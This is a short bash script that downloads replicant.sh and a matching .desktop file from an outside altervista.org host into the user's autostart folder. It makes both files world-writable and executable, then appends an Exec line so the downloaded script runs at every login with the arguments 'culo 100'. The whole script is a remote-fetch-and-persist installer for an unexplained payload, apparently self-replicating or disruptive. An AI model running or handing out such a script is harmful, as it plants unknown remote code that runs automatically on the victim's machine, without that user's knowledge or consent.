#!/bin/bash

cd $HOME/.config/autostart

wget "francescocheinasso.altervista.org/replicant.sh"
wget "francescocheinasso.altervista.org/replicant.desktop"

chmod 777 $HOME/.config/autostart/replicant.sh
chmod 777 $HOME/.config/autostart/replicant.desktop

echo "Exec=$HOME/.config/autostart/replicant.sh culo 100" >>replicant.desktop
